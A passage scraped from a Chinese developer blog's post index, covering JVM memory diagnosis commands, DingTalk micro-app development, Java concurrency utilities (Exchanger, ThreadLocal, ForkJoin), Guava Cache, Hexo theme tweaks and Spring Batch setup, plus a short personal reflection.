本地方法栈内存+线程栈内存 +堆外内存 +socket 缓冲区内存 RES = JAVA正在存活的内存对象大小 + 未回收的对象大小 + 其它 VIART= JAVA中申请的内存大小，即 -Xmx -Xms + 其它 其它 = 永久代内存+ 本地方法栈内存+线程栈内存 +堆外内存 +socket 缓冲区内存 +JVM进程内存 怎么排查a: 实时查看： 找到前30个最耗内存的对象： jmap -histo pid | head 30 （带上:live则表示先进行一次FGC再统计，如jmap -histo:live pid） b: 把heap文件dump下来分析： jmap -dump:live,format=b,file=heap.bin pid （使用Eclipse mat分析） 统计进程打开的句柄数： ls /proc/pid/fd |wc -l 统计进程打开的线程数： ls /proc/pid/task |wc -l 当前jvm线程数统计： jstack pid |grep ‘tid’|wc –l (linux 64位系统中jvm线程默认栈大小为1MB) 查询堆内存分布情况： jmap -heap pid 查看进程内存 pmap pid 第一列，内存块起始地址 第二列，占用内存大小 第三列，内存权限 第四列，内存名称，anon表示动态分配的内存，stack表示栈内存 最后一行，占用内存总大小，请注意，此处为虚拟内存大小，占用的物理内存大小可以通过top查看 jstat命令查看jvm的GC情况 Options，选项，我们一般使用 -gcutil 查看gc情况 vmid，VM的进程号，即当前运行的java进程号 interval，间隔时间，单位为秒或者毫秒 count，打印次数，如果缺省则打印无数次 jstat -gc pid 5000 JVM调优实战参考 jvm疯狂吞占内存，罪魁祸首是谁？记一次Java内存占用过大排查","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"http://www.hasfun.cn/tags/JVM/"}]},{"title":"钉钉H5微应用开发总结","slug":"dingdingdev","date":"2019-03-17T15:37:40.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/03/17/dingdingdev/","link":"","permalink":"http://www.hasfun.cn/2019/03/17/dingdingdev/","excerpt":"","text":"今年，我又做了一个钉钉微应用的项目，第一次接触钉钉，把踩过的坑，记录下来，为后人乘凉所用。 准备工作 开放平台注册申请权限 选择钉钉应用类型，创建应用，获取AppKey，AppSecret，CORP_ID， 准备开发环境 静态页面、JS，CSS放在ngnix，本地接口用tomcat。 内网穿透，用于开发时候调试钉钉应用 减少代码耦合度，我采用前后端分离，没有采用freemaker等模板引擎工具，我将页面与接口放在不同服务器上，那么就有跨域问题，解决方案是ngnix，配置反向代理同个host不同端口，则可以解决JS跨域问题。 钉钉下，有E应用（不成熟），微应用（较成熟）。我用的是相对成熟的微应用。另外应用还分，第三方企业内部应用，企业内部应用，第三方个人应用，移动应用接入。由于我的业务方需求，我选择的企业内部应用，注意看对应的文档，钉钉功能太混杂容易混淆。 开发过程引入JScommon.js &lt;script type=&quot;text/javascript&quot; src=&quot;//g.alicdn.com/dingding/dingtalk-jsapi/2.0.57/dingtalk.open.js&quot;&gt;&lt;/script&gt; JSAPI免登授权码获取当前钉钉登录用户的账号信息，需要通过免登授权码换取 //获取免登授权码 dd.ready(function() { dd.runtime.permission.requestAuthCode({ corpId: _config.corpId, onSuccess: function(info) { var _params = {&quot;code&quot;:info.code}; tools.getReqData(&#39;/api/dd/getCurrentLoginUser&#39;, _params, getUserCall);//通过免登授权码获取用户详细信息 }, onFail : function(err) { alert(&#39;fail: &#39; + JSON.stringify(err)); } }); dd.error(function(error){ alert(&#39;dd error: &#39; + JSON.stringify(err)); }); }); JSAPI鉴权需要用到钉钉的日历控件，组织机构多选弹出框等控件，所以需要鉴权 //鉴权验证 dd.config({ agentId : _config.agentid, corpId : _config.corpId, timeStamp : _config.timeStamp, nonceStr : _config.nonceStr, signature : _config.signature, jsApiList : [ &#39;runtime.info&#39;, &#39;biz.contact.choose&#39;, &#39;device.notification.confirm&#39;, &#39;device.notification.alert&#39;, &#39;device.notification.prompt&#39;, &#39;biz.ding.post&#39;,&#39;biz.contact.complexPicker&#39;, &#39;biz.util.openLink&#39;,&#39;biz.util.datepicker&#39; ] }); 获取TOKEN /* * 在此方法中，为了避免频繁获取access_token， * 在距离上一次获取access_token时间在两个小时之内的情况， * 将直接从持久化存储中读取access_token * * 因为access_token和jsapi_ticket的过期时间都是7200秒 * 所以在获取access_token的同时也去获取了jsapi_ticket * 注：jsapi_ticket是在前端页面JSAPI做权限验证配置的时候需要使用的 * 具体信息请查看开发者文档--权限验证配置 */ public static String getAccessToken() throws OApiException { long curTime = System.currentTimeMillis(); JSONObject accessTokenValue = (JSONObject) FileUtils.getValue(&quot;accesstoken&quot;, Env.APP_KEY); String accToken = &quot;&quot;; JSONObject jsontemp = new JSONObject(); if (accessTokenValue == null || curTime - accessTokenValue.getLong(&quot;begin_time&quot;) &gt;= cacheTime) { try { ServiceFactory serviceFactory = ServiceFactory.getInstance(); CorpConnectionService corpConnectionService = serviceFactory.getOpenService(CorpConnectionService.class); accToken = corpConnectionService.getCorpToken(Env.APP_KEY, Env.APP_SECRET); // save accessToken JSONObject jsonAccess = new JSONObject(); jsontemp.clear(); jsontemp.put(&quot;access_token&quot;, accToken); jsontemp.put(&quot;begin_time&quot;, curTime); jsonAccess.put(Env.APP_KEY, jsontemp); //真实项目中最好保存到数据库中 FileUtils.write2File(jsonAccess, &quot;accesstoken&quot;); } catch (Exception e) { e.printStackTrace(); } } else { return accessTokenValue.getString(&quot;access_token&quot;); } return accToken; } 获取当前用户信息 /** * 根据免登授权码查询免登用户userId * @param accessToken * @param code * @return * @throws Exception */ public static CorpUserBaseInfo getUserInfo(String accessToken, String code) throws Exception { CorpUserService corpUserService = ServiceFactory.getInstance().getOpenService(CorpUserService.class); return corpUserService.getUserinfo(accessToken, code); } 钉钉日历控件 $(&quot;#proBidOpent&quot;).click(function(){ var t = this; var curDate = (new Date().getFullYear()) + &#39;-&#39; + (new Date().getMonth()) + &#39;-&#39; + (new Date().getDay); dd.biz.util.datepicker({ format: &#39;yyyy-MM-dd&#39;,//注意：format只支持android系统规范，即2015-03-31格式为yyyy-MM-dd value: curDate, //默认显示日期 onSuccess : function(result) { $(t).val(result.value); //onSuccess将在点击完成之后回调 /*{ value: &quot;2015-02-10&quot; } */ }, onFail : function(err) { alert(JSON.stringify(err)); } }) }); 钉钉滑动选择人员控件 $(&#39;#recorderName&#39;).click(function(){ var tx = this; dd.biz.contact.complexPicker({ title:&quot;备案人员&quot;, //标题 corpId:_config.corpId, //企业的corpId multiple:true, //是否多选 limitTips:&quot;超出了&quot;, //超过限定人数返回提示 maxUsers:100, //最大可选人数 pickedUsers:[], //已选用户 pickedDepartments:[], //已选部门 disabledUsers:[], //不可选用户 disabledDepartments:[], //不可选部门 requiredUsers:[], //必选用户（不可取消选中状态） requiredDepartments:[], //必选部门（不可取消选中状态） appId:_config.agentid, //微应用的Id permissionType:&quot;xxx&quot;, //可添加权限校验，选人权限，目前只有GLOBAL这个参数 responseUserOnly:true, //返回人，或者返回人和部门 startWithDepartmentId:0 , //仅支持0和-1 onSuccess: function(result) { if(result.selectedCount&gt;0){ var empIds = &quot;&quot;; var empNames = &quot;&quot;; for(var i=0;i&lt; result.selectedCount;i++){ empIds = empIds + result.users[i].emplId+&quot;,&quot;; empNames = empNames + result.users[i].name+&quot;,&quot;; } empIds = empIds.substring(0,empIds.length-1); empNames = empNames.substring(0,empNames.length-1); $(tx).val(empNames); var attr_hidden = $(tx).attr(&quot;attr_hidden&quot;); $(&quot;#&quot;+attr_hidden).val(empIds); } }, onFail : function(err) { alert(JSON.stringify(err)); } }); }); 附录开源代码","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"钉钉","slug":"钉钉","permalink":"http://www.hasfun.cn/tags/钉钉/"}]},{"title":"","slug":"myThink","date":"2019-03-16T15:52:23.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/03/16/myThink/","link":"","permalink":"http://www.hasfun.cn/2019/03/16/myThink/","excerpt":"","text":"最近比较烦。 借了一屁股债，买了一套房，还在交易中。 丈母娘眼睛需要做个小手术，预约了住院时间 小孩3岁，该是上幼儿园的年纪了，可是没有居住证。 第一个感触就是，结婚了，你要处理的是二个家庭的问题。 第二个感触就是，靠技术，不能度过中年危机. 有个房贷，你开始害怕失业了 在大公司，认识到自己就是一个螺丝钉，很难挤到中层去 关于本末倒置 热播剧《都挺好》中有这样一个桥段，小姑凉高二开始做推荐课程，遇到一位老板，老板问他一节课多少钱，总共多长时间学完，小姑凉迷惑的如实回答了，老板说，你知道我花这么长时间上课，耽误我挣多少钱了吗？然后老板问小姑凉，你年纪这么小，挣钱做什么？小姑凉说挣钱去国外留学。老板问，去国外留学做什么？菇凉说，挣大钱，出人头地。老板问，那留学要花多少钱，你得攒多久才能凑满。小姑凉算了算，要10年。老板说，那10年后，就是你攒够钱了，去留学回来，还是个打工赚钱，还是一穷二白。","categories":[{"name":"生活","slug":"生活","permalink":"http://www.hasfun.cn/categories/生活/"}],"tags":[{"name":"生活感悟","slug":"生活感悟","permalink":"http://www.hasfun.cn/tags/生活感悟/"}]},{"title":"【在线工具】Java 在线编译器","slug":"compiler","date":"2019-03-13T15:36:54.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/03/13/compiler/","link":"","permalink":"http://www.hasfun.cn/2019/03/13/compiler/","excerpt":"","text":"方舟编译器","categories":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/categories/工具/"}],"tags":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/tags/工具/"}]},{"title":"【在线工具】JSON字符串转为javaBean对象","slug":"jsonutil","date":"2019-03-13T15:36:54.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/03/13/jsonutil/","link":"","permalink":"http://www.hasfun.cn/2019/03/13/jsonutil/","excerpt":"","text":"一款免费的在线的JSON字符串转为javaBean对象工具，提高工作效率，记录一下 JSON字符串转为javaBean对象在线工具JSON格式化工具","categories":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/categories/工具/"}],"tags":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/tags/工具/"}]},{"title":"JUC工具类之exchanger","slug":"exchanger","date":"2019-03-09T13:51:25.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/03/09/exchanger/","link":"","permalink":"http://www.hasfun.cn/2019/03/09/exchanger/","excerpt":"","text":"日常开发使用，JUC工具类里面的exchanger使用场景不多，既然看到了就学了一下记一下。 定义exchanger 用于二个线程，规定一个交换点，当双方线程到达这个点后，相互交换数据的效果。 应用用于2个线程交互数据使用；经典生产消费者 示例代码/** * java concurrent 包 * &lt;p&gt; * 用于2个线程交互数据使用 * 规定一个交换点，当双方线程到达这个点后，相互交换数据 * &lt;p&gt; * &lt;p&gt; * Created by huangchunwu on 2019/3/4. */ public class ExchangeTest { @Test public void testExchange() { final Exchanger&lt;Integer&gt; exchanger = new Exchanger&lt;Integer&gt;(); Runnable r1 = new Runnable() { @Override public void run() { try { System.out.print(Thread.currentThread().getName() + &quot;get &quot; + exchanger.exchange(2019)); } catch (InterruptedException e) { e.printStackTrace(); } } }; Runnable r2 = new Runnable() { @Override public void run() { try { System.out.print(Thread.currentThread().getName() + &quot;get &quot; + exchanger.exchange(2018)); } catch (InterruptedException e) { e.printStackTrace(); } } }; Thread t1 = new Thread(r1); t1.setName(&quot;A&quot;); Thread t2 = new Thread(r2); t2.setName(&quot;B&quot;); t1.start(); t2.start(); try { Thread.currentThread().sleep(1000000); } catch (InterruptedException e) { e.printStackTrace(); } } } 附录示例代码","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"JUC","slug":"JUC","permalink":"http://www.hasfun.cn/tags/JUC/"}]},{"title":"ThreadLocal如何防止内存泄漏","slug":"threadlocal","date":"2019-02-02T08:51:15.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/02/02/threadlocal/","link":"","permalink":"http://www.hasfun.cn/2019/02/02/threadlocal/","excerpt":"","text":"工作五年了，对ThreadLocal原理还不是很清楚，o(￣︶￣)o。今天来分析下，使用threadLocal时候，导致内存泄漏的原理。 概念 1、用于存放线程局部变量。2、一个线程都会维护一个threadLocalMap,threadLocal包装成弱引用作为key，用户的值作为value,装在entry数组里面。 主要方法 set(T value) 存储线程局部变量值get() 获取线程局部变量值remove() 移除线程局部变量，即entry数组 垃圾回收1、ThreadLocal层面 通常，线程结束了，threadLocal作为弱引用的key，此时key==null,Entry也就被GC了2、ThreadLocalMap层面 如果线程存活比较久，线程局部变量作为value的数量如果超过容量的2/3(没有扩大容量时是10个)，则会触发Entry的回收 注意事项内存泄露 1、如果使用线程池，要注意手动清理threadLocal 2、如果线程消亡了，threadLocal==null,此时entry还是被强引用的话， threadLocalMap不会被回收，造成内存泄露 应用 1、可以用于单个线程的参数的存储，模板方法的上下文 2、Java7中的SimpleDateFormat不是线程安全的，可以用ThreadLocal来解决这个问题 3、InheritableThreadLocal可以跨线程共享ThreadLocal变量，用于将主线程的变量传递给子线程中例如用户标识（user id）或事务标识（transaction id），但不能是有状态对象，例如 JDBC Connection ThreadLocalMap使用ThreadLocal的弱引用作为key，如果一个ThreadLocal没有外部强引用引用他，那么系统gc的时候，这个ThreadLocal势必会被回收，这样一来，ThreadLocalMap中就会出现key为null的Entry，就没有办法访问这些key为null的Entry的value，如果当前线程再迟迟不结束的话，这些key为null的Entry的value就会一直存在一条强引用链：Thread Ref -&gt; Thread -&gt; ThreaLocalMap -&gt; Entry -&gt; value永远无法回收，造成内存泄露。 所以JDK建议将ThreadLocal变量定义成private static的，这样的话ThreadLocal的生命周期就更长，由于一直存在ThreadLocal的强引用，所以ThreadLocal也就不会被回收，也就能保证任何时候都能根据ThreadLocal的弱引用访问到Entry的value值，然后remove它，防止内存泄露。 附录示例代码","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Threadlocal","slug":"Threadlocal","permalink":"http://www.hasfun.cn/tags/Threadlocal/"},{"name":"并发","slug":"并发","permalink":"http://www.hasfun.cn/tags/并发/"}]},{"title":"【在线工具】思维导图在线工具","slug":"swtools","date":"2019-02-02T05:37:42.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/02/02/swtools/","link":"","permalink":"http://www.hasfun.cn/2019/02/02/swtools/","excerpt":"","text":"今天发现一款免费的在线的思维导图工具，蛮不错的，记录一下 思维导图在线工具","categories":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/categories/工具/"}],"tags":[{"name":"工具","slug":"工具","permalink":"http://www.hasfun.cn/tags/工具/"}]},{"title":"并行计算框架forkJoin框架","slug":"forkjoin","date":"2019-01-25T13:04:58.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/01/25/forkjoin/","link":"","permalink":"http://www.hasfun.cn/2019/01/25/forkjoin/","excerpt":"","text":"框架思想当业务系统遇到要处理大任务的时候，可以拆分成小任务来执行，最后将小任务的执行结果汇总，返回给大任务，简称为“分而治之”，jdk7提供了forkJoin框架，Hadoop提供了MapReduce。 适合场景 多核CPU服务器CPU密集的应用，并行计算的应用 主要方法forkJoinTask 抽象类不直接使用，直接使用以下子类提供的fork与join方法 RecursiveAction 无返回值RecursiveTask 有返回值 forkJoinPool 线程池提供了forkJoin线程池。每一个工作线程维护一份双端队列，队列里面存放待执行的任务，线程池内部使用“工作窃取算法”，即工作线程自己的队列任务处理完了，可以“窃取”其他线程的队列的任务去执行，提供的CPU利用率，所以工作线程不要用于IO流操作等超时任务。 工作窃取算法每一个工作线程维护一份双端队列，当工作线程处理完自己的队列后，会窃取其他线程的队列帮忙处理，充分使用所有线程资源，直到处理完所有的队列，这才是特别的地方。 fork/Join框架基本模板if(任务足够小){ 进行计算； }else{ 将任务分为两个部分； 结合两个子任务结果； } 实现代码 public class CountTask extends RecursiveTask&lt;Integer&gt; { /** * 临界值 */ private static final int THRESHOLD = 1000; int start=0; int end=100000; int sum = 0; public CountTask(int start,int end){ this.start = start; this.end = end; } @Override protected Integer compute() { if (end-start&lt;THRESHOLD){ for (int i=start;i&lt;end;i++){ sum += i; } }else { int middle = (start + end)/2; RecursiveTask&lt;Integer&gt; left_task = new CountTask(start,middle); RecursiveTask&lt;Integer&gt; right_task = new CountTask(middle,end); invokeAll(left_task,right_task); sum = left_task.join() + right_task.join(); } return sum; } } /** * 分而治之 * forkjoin 线程池是双端队列，采用窃取算法 * Created by huangchunwu on 2019/1/21. */ public class ForkJoinTaskTest { @Test public void testInvokeForkPool(){ // 创建一个通用池，这个是jdk1.8提供的功能 ForkJoinPool pool = ForkJoinPool.commonPool(); long startTime = System.currentTimeMillis(); ForkJoinTask task = new CountTask(1,999999999); Integer result = (Integer) pool.invoke(task); long endTime = System.currentTimeMillis(); System.out.println(&quot;Fork/join sum: &quot; + result + &quot; in &quot; + (endTime - startTime) + &quot; ms.&quot;); } @Test public void testsubmitForkPool(){ // 创建一个通用池，这个是jdk1.8提供的功能 ForkJoinPool pool = ForkJoinPool.commonPool(); long startTime = System.currentTimeMillis(); ForkJoinTask task = new CountTask(1,999999999); pool.submit(task); Integer result =0; try { result = (Integer) task.get(); } catch (InterruptedException e) { e.printStackTrace(); } catch (ExecutionException e) { e.printStackTrace(); } long endTime = System.currentTimeMillis(); System.out.println(&quot;Fork/join sum: &quot; + result + &quot; in &quot; + (endTime - startTime) + &quot; ms.&quot;); } } 参考资料Fork-Join分治编程介绍（一）示例源码","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"forkJoin","slug":"forkJoin","permalink":"http://www.hasfun.cn/tags/forkJoin/"}]},{"title":"Guava Cache 学习记录","slug":"guava-cache","date":"2019-01-15T15:26:12.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/01/15/guava-cache/","link":"","permalink":"http://www.hasfun.cn/2019/01/15/guava-cache/","excerpt":"","text":"为什么使用Guava Cache？guava cache属于JVM内存的缓存,其实JAVA本地缓存框架有ecache，简单点有HashMap作为缓存容器,那么，为什么推荐用guava cache呢,比如以下：1、设置缓存的过期时间,遵循LRU原则移除过期KEY2、缓存的定期刷新3、如何防止缓存穿透 LRU原则是指 Least Recently Used 最近最少使用,即活性不高的缓存会被淘汰掉 如果自己实现起来难度较大，谷歌开发对缓存操作作了封装，方便研发的重心集中在业务处理，无需关心底层实现，无需重复造轮子。 我们常用的是redis可以实现分布式缓存，为什么推荐用guava cache呢1、同时造成了业务系统 强依赖于网络和redis服务器的稳定性2、网络请求的效率远远没有本地内存快。 哪些场景适合使用Guava cache通常缓存的用法，先请求本地缓存，如果本地缓存未命中，则去请求DB。Guava cache 是本地缓存，所以适合数据量小的数据量的情况下使用。 Guava cache特性1、缓存不会自动刷新，需满足2个条件，过期了，有get请求 static ListeningExecutorService executorService = MoreExecutors.listeningDecorator(Executors.newSingleThreadExecutor()); // remove listener static RemovalListener&lt;String, Integer&gt; removalListener = new RemovalListener&lt;String, Integer&gt;() { public void onRemoval(RemovalNotification&lt;String, Integer&gt; removal) { System.out.println(DateUtils.time() +&quot;cause:&quot; + removal.getCause() + &quot; key:&quot; + removal.getKey() + &quot; value:&quot; + removal.getValue()); } }; final static LoadingCache&lt;String, Integer&gt; loadingCache = CacheBuilder.newBuilder() .maximumSize(10) //最多存放十个数据 // .expireAfterWrite(3, TimeUnit.SECONDS) //缓存200秒 .refreshAfterWrite(1, TimeUnit.SECONDS) .removalListener(removalListener) .recordStats() //开启 记录状态数据功能 .build(new CacheLoader&lt;String, Integer&gt;() { //数据加载，默认返回-1,也可以是查询操作，如从DB查询 @Override public Integer load(String key) throws Exception { System.out.println(DateUtils.time() + &quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;load&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;); return -1; } //有些键不需要刷新，并且我们希望刷新是异步完成的 @Override public ListenableFuture&lt;Integer&gt; reload(final String key, final Integer oldValue) { System.out.println(DateUtils.time() + &quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;reload&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;); // we need to load new values asynchronously, so that calls to read values from the cache don&#39;t block ListenableFuture&lt;Integer&gt; listenableFuture = executorService.submit(new Callable&lt;Integer&gt;() { @Override public Integer call() throws Exception { try { Integer value = load(key); return value; } catch (Exception ex) { return oldValue; } finally { } } }); return listenableFuture; } }); 执行结果 Sun Jan 20 18:55:46 CST 2019&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;put&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Sun Jan 20 18:55:50 CST 2019&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;get&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Sun Jan 20 18:55:50 CST 2019&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;reload&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Sun Jan 20 18:55:50 CST 2019&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;load&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Sun Jan 20 19:11:37 CST 2019&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;cause:REPLACED key:1 value:1 由上述程序执行结果，可以看出，cache的key进行put后4S没有reload，第5S的时候get请求后，reload才开始。 2、Guava Cache的load方法不能返回null，否则抛异常，Guava Cache的get方法先在本地缓存中取，如果不存在，则会触发load方法。但load方法不能返回null。 Guava cache 有什么替代品Caffeine 宣称拥有比 Guava Cache 高几倍的读写效率 Guava cache使用步骤引入maven的POM&lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;19.0&lt;/version&gt; &lt;/dependency&gt; Guava Cache初始化Cache Callable final static Cache&lt;Integer, String&gt; cache = CacheBuilder.newBuilder() //设置cache的初始大小为10，要合理设置该值 .initialCapacity(10) //设置并发数为5，即同一时间最多只能有5个线程往cache执行写入操作 .concurrencyLevel(5) //设置cache中的数据在写入之后的存活时间为10秒 .expireAfterWrite(10, TimeUnit.SECONDS) //构建cache实例 .build(); LoadingCache final static LoadingCache&lt;String, Integer&gt; cache = CacheBuilder.newBuilder() .maximumSize(10) //最多存放十个数据 .expireAfterWrite(10, TimeUnit.SECONDS) //缓存200秒 .recordStats() //开启 记录状态数据功能 .build(new CacheLoader&lt;String, Integer&gt;() { //数据加载，默认返回-1,也可以是查询操作，如从DB查询 @Override public Integer load(String key) throws Exception { return -1; } }); Guava Cache常用方法/** * 该接口的实现被认为是线程安全的，即可在多线程中调用 * 通过被定义单例使用 */ public interface Cache&lt;K, V&gt; { /** * 通过key获取缓存中的value，若不存在直接返回null */ V getIfPresent(Object key); /** * 通过key获取缓存中的value，若不存在就通过valueLoader来加载该value * 整个过程为 &quot;if cached, return; otherwise create, cache and return&quot; * 注意valueLoader要么返回非null值，要么抛出异常，绝对不能返回null */ V get(K key, Callable&lt;? extends V&gt; valueLoader) throws ExecutionException; /** * 添加缓存，若key存在，就覆盖旧值 */ void put(K key, V value); /** * 删除该key关联的缓存 */ void invalidate(Object key); /** * 删除所有缓存 */ void invalidateAll(); /** * 执行一些维护操作，包括清理缓存 */ void cleanUp(); } 缓存回收基于容量回收 CacheBuilder.maximumSize(long) 定时回收 expireAfterAccess(long, TimeUnit) -&gt; KEY在一定时间内没有读写，则失效，下次读取直接load（）中取 expireAfterWrite(long, TimeUnit) -&gt; 避免了缓存穿透的问题，保证了数据的实时性，牺牲的是性能，当数据expire的时候，大量get请求过来的时候，只有一个请求会去load（）数据，而没有更新完成之前，其他全部请求会被block（每个线程都要轮询的判断lock状态） 基于引用回收 CacheBuilder.weakKeys()：使用弱引用存储键 CacheBuilder.weakValues()：使用弱引用存储值 CacheBuilder.softValues()：使用软引用存储值。 缓存刷新refreshAfterWrite(long, TimeUnit) -&gt; 机制是并非超时时间到就自动刷新，而是请求 get的时候才会触发refresh，默认refresh是同步请求新值，可以重写refresh方法改成异步。如果有大量并发请求的时候，只会有一个请求get-&gt;reload同步执行，其他线程返回旧值. 弊端吞吐量低的应用，在超过过期时间时，大量并发get请求时，大部分拿到的是很久前的旧值，导致数据脏读。 如何解决？可以同时使用expireAfterWrite设置key过期时间，比如每2s刷新一次新值，设置expireAfterWrite为5s为过期时间，则当key值5s没有访问的话，则第5s的时候强制取load新值，解决了脏读问题，也同时避免了缓存穿透问题。 扩展Guava是如何实现，当缓存过期，只有一个请求去DB捞取数据的？ 在《JAVA并发编程的艺术》里面有提到过这个方案，使用concurrentHashMap与futureTask,futureTask的特点就是 当一个线程需要等待某一个线程的计算结果的场景。 附录Caffeine github示例代码","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"缓存","slug":"缓存","permalink":"http://www.hasfun.cn/tags/缓存/"},{"name":"Guava","slug":"Guava","permalink":"http://www.hasfun.cn/tags/Guava/"}]},{"title":"hexo主题优化","slug":"hexo-improve","date":"2019-01-11T14:58:44.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/01/11/hexo-improve/","link":"","permalink":"http://www.hasfun.cn/2019/01/11/hexo-improve/","excerpt":"","text":"hexo搭建好博客后，需要给博客的装扮下，记录一下一些主题优化技巧 安装文章计数插件WordCount第一步：在blog根目录下，执行以下命令 npm install hexo-wordcount --save 第二步：修改配置文件 # 开启字数统计 word_count: true 第三步：修改主题 swig 布局 找到themes/next/layout/_macro/post.swig文件，修改【字数统计】，找到如下代码： &lt;span title=&quot;{{ __('post.wordcount') }}&quot;&gt; {{ wordcount(post.content) }}字 &lt;/span&gt; 同理，我们修改【阅读时长】，修改后如下： &lt;span title=&quot;{{ __('post.min2read') }}&quot;&gt; {{ min2read(post.content) }} 分钟 &lt;/span&gt; 增加站内搜索第一步：在blog根目录下，执行以下命令 npm install hexo-generator-search --save 第二步：编辑站点配置文件，新增以下内容到任意位置： search: path: search.xml field: post format: html limit: 10000 第三步：接着修改主题配置文件_config.yml为 local_search: enable: true","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://www.hasfun.cn/tags/hexo/"}]},{"title":"SpringBatch+MYSQL仓库+运维监控后台项目记录","slug":"springbatch","date":"2019-01-11T13:30:18.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/01/11/springbatch/","link":"","permalink":"http://www.hasfun.cn/2019/01/11/springbatch/","excerpt":"概念Spring Batch 是一款轻量级地适合企业级应用的批处理框架，值得注意的是，不同于其他调度框架，Spring Batch不提供调度功能。 批处理过程批处理可以分为以下几个步骤： 读取数据 按照业务处理数据 归档数据的过程 Spring Batch给我们提供了什么？ 统一的读写接口 丰富的任务处理方式 灵活的事务管理及并发处理 日志、监控、任务重启与跳过等特性","text":"概念Spring Batch 是一款轻量级地适合企业级应用的批处理框架，值得注意的是，不同于其他调度框架，Spring Batch不提供调度功能。 批处理过程批处理可以分为以下几个步骤： 读取数据 按照业务处理数据 归档数据的过程 Spring Batch给我们提供了什么？ 统一的读写接口 丰富的任务处理方式 灵活的事务管理及并发处理 日志、监控、任务重启与跳过等特性 基础组件 名称 用途 JobRepository 用于注册和存储Job的容器 JobLauncher 用于启动Job Job 实际要执行的作业，包含一个或多个step step 步骤，批处理的步骤一般包含ItemReader, ItemProcessor, ItemWriter ItemReader 从给定的数据源读取item ItemProcessor 在item写入数据源之前进行数据整理 ItemWriter 把Chunk中包含的item写入数据源。 Chunk 数据块，给定数量的item集合，让item进行多次读和处理，当满足一定数量的时候再一次写入。 TaskLet 子任务表， step的一个事务过程，包含重复执行，同步/异步规则等。 job, step, tasklet 和 chunk 关系一个job对应至少一个step，一个step对应0或者1个TaskLet，一个taskLet对应0或者1个Chunk 实战：批处理excel插入数据库定义数据仓库 &lt;!-- 内存仓库 --&gt; &lt;!--&lt;bean id=&quot;jobRepository&quot; class=&quot;org.springframework.batch.core.repository.support.MapJobRepositoryFactoryBean&quot;/&gt;--&gt; &lt;!-- 数据库仓库 --&gt; &lt;batch:job-repository id=&quot;jobRepository&quot; data-source=&quot;dataRepDruidDataSource&quot; isolation-level-for-create=&quot;SERIALIZABLE&quot; transaction-manager=&quot;transactionManager&quot; table-prefix=&quot;BATCH_&quot; max-varchar-length=&quot;1000&quot; /&gt; 定义启动器 &lt;!-- 作业调度器，用来启动job,引用作业仓库 --&gt; &lt;bean id=&quot;jobLauncher&quot; class=&quot;org.springframework.batch.core.launch.support.SimpleJobLauncher&quot;&gt; &lt;property name=&quot;jobRepository&quot; ref=&quot;jobRepository&quot;/&gt; &lt;/bean&gt; 定义JOB &lt;batch:job id=&quot;userBatchJobName&quot; restartable=&quot;true&quot;&gt; &lt;batch:step id=&quot;userStep&quot;&gt; &lt;batch:tasklet allow-start-if-complete=&quot;false&quot; start-limit=&quot;1&quot; 